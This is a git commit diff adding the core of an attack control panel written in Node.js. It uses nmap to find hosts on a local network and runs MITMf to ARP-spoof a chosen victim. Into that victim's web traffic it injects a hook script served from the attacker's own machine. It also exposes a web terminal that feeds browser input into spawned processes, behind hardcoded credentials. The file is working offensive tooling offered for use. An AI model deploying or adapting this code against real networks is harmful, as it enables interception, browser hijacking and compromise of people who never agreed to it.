e90be2053afb33355a9abecc89970b987e2f25e3
Timé KADEL <time.kadel@sfr.fr>
2016-09-09 18:41:58 +0100

    Fully functionnal Hooking + Web terminal
    TODO: Create attack plugins + Hook/Ip automated file generation

--- index.js
+++ index.js
@@ -1,72 +1,128 @@
-var http = require("http");
+//var http = require("http");
+var express = require('express');
+var session = require('express-session');
+var app = express();
+var http = require('http').Server(app);
+var terminal = require("web-terminal");
 var url = require('url');
 var fs = require('fs');
-var io = require('socket.io');
-var app = require('express');
-var express = require('express');
+var io = require('socket.io')(http);
+var url = require('url') ;
+var bodyParser = require('body-parser');
+var Convert = require('ansi-to-html');
+var convert = new Convert();
+var sys   = require('sys'),
+    util  = require('util'),
+    spawn = require('child_process').spawn;
 
-var server = http.createServer(function(request, response){
-    var path = url.parse(request.url).pathname;
-    switch(path){
-        case '/':
-            response.writeHead(200, {'Content-Type': 'text/html'});
-            response.write('hello');
-            response.end();
-            break;
-        case '/index.html':
-            fs.readFile(__dirname + path, function(error, data){
-                if (error){
-                    response.writeHead(404);
-                    response.write("opps this doesn't exist - 404");
-                    response.end();
-                }
-                else{
-                    response.writeHead(200, {"Content-Type": "text/html"});
-                    response.write(data, "utf8");
-                    response.end();
-                }
-            });
-            break;
-        case '/hook/pnsmn.js':
-            fs.readFile(__dirname + path, function(error, data){
-                if (error){
-                    response.writeHead(404);
-                    response.write("opps this doesn't exist - 404");
-                    response.end();
-                }
-                else{
-                    response.writeHead(200, {"Content-Type": "text/javascript"});
-                    response.write(data, "utf8");
-                    response.end();
-                }
-            });
-            break;
-        case '/node.png':
-            fs.readFile(__dirname + path, function(error, data){
-                if (error){
-                    response.writeHead(404);
-                    response.write("opps this doesn't exist - 404");
-                    response.end();
-                }
-                else{
-                    response.writeHead(200, {"Content-Type": "image/png"});
-                    response.write(data, "binary");
-                    response.end();
-                }
-            });
-            break;
-        default:
-            response.writeHead(404);
-            response.write("opps this doesn't exist - 404");
-            response.end();
-            break;
+/*
+Virtual terminal Configuration:
+->Spawns a terminal and listens for
+->input on coming from the client side
+*/
+
+function openTerminal(arg,options){
+
+    sh = spawn(arg,options);
+
+    sh.stdout.on('data', function(data) {
+        console.log(data.toString());
+        listener.sockets.emit('terminal',{"text":convert.toHtml(data.toString())});
+        scannedClients();
+    });
+
+    sh.stderr.on('data', function (data) {
+        listener.sockets.emit("terminal", {"text":data.toString()});
+    });
+
+    sh.stdin.on('end', function() {
+        console.log('process ended');
+    });
+
+}
+
+/*
+Web server configuration:
+->Configuration of the files and
+->user management of the server
+->server is accessible from port 5001
+*/
+app.use(express.static(__dirname + '/public'));
+app.use(session({secret: 'dIcKbuTT'}));
+app.use(bodyParser.urlencoded({ extended: false }))
+
+app.get('/', function(req, res){
+
+    sess = req.session;
+
+    if(sess.userid){
+      res.sendFile(__dirname +'/index.html');
+    }else{
+        res.redirect('/login.html');
     }
+
+});
+http.listen(5001);
+var listener = io.listen(http);
+
+app.post('/login.html', function(req, res) {
+
+    if(req.body.username == "pnsmn" && req.body.password == "pnsmn"){
+        sess = req.session;
+        sess.userid=req.body.username;
+        res.redirect('/');
+    }else{
+        res.redirect('/login.html');
+    }
+
 });
 
-server.listen(5001);
+app.post('/termEmbed.html', function(req, res) {
 
-var listener = io.listen(server);
+    if(req.body.username == "pnsmn" && req.body.password == "pnsmn"){
+        sess = req.session;
+        sess.userid=req.body.username;
+        res.redirect('/termEmbed.html');
+    }else{
+        res.redirect('/login.html');
+    }
 
+});
+
+/*
+XML file parsing:
+->Parses the xml file generated
+->by nmap in order to display
+->clients on the network
+*/
+var scannedClients = function(baseName, queryName) {
+    var XMLPath = "public/output.xml";
+    var rawJSON = loadXMLDoc(XMLPath);
+    function loadXMLDoc(filePath) {
+        var fs = require('fs');
+        var xml2js = require('xml2js');
+        var json;
+        try {
+            var fileData = fs.readFileSync(filePath, 'ascii');
+
+            var parser = new xml2js.Parser();
+            parser.parseString(fileData.substring(0, fileData.length), function (err, result) {
+            json = JSON.stringify(result.nmaprun.host);
+            listener.sockets.emit("nmap", json);
+        });
+        return json;
+    } catch (ex) {console.log(ex)}
+ }
+};
+
+
+
+var ip = require("ip");
+console.log(ip.mask(ip.address(), ip.fromPrefixLen(24)));
+
+/*
+Listening to sockets and emitting data
+*/
 listener.sockets.on('connection', function(socket){
 
     var tmstp = socket.handshake.time;
@@ -78,8 +134,28 @@ listener.sockets.on('connection', function(socket){
         console.log('Got connection from: '+ip.ip);
     });
 
+
     socket.on('disconnect', function() {
       console.log('Got disconnect!');
       socket.broadcast.emit('hide_client',{'id':socket.id});
     });
+
+    socket.on('scan_network',function(){
+        var options = ['-oX','public/output.xml','-sn','192.168.1.0/24'];
+        openTerminal('nmap',options);
+    });
+
+    socket.on('message', function(data){
+        sh.stdin.write(data+"\n");
+    });
+
+    socket.on('mitmf_client', function(data){
+        sh.kill();
+        process.chdir('/root/MITMf');
+        var gateway = ip.mask(ip.address(), ip.fromPrefixLen(24));
+        var scriptPath = 'http://'+ip.address()+':5001/hook/pnsmn.js';
+        var options = ['mitmf.py','-i','wlan0','--spoof','--arp','--target',data.ip,'--gateway','192.168.1.1','--inject','--js-url',scriptPath];
+        openTerminal("python",options);
+    });
+
 });
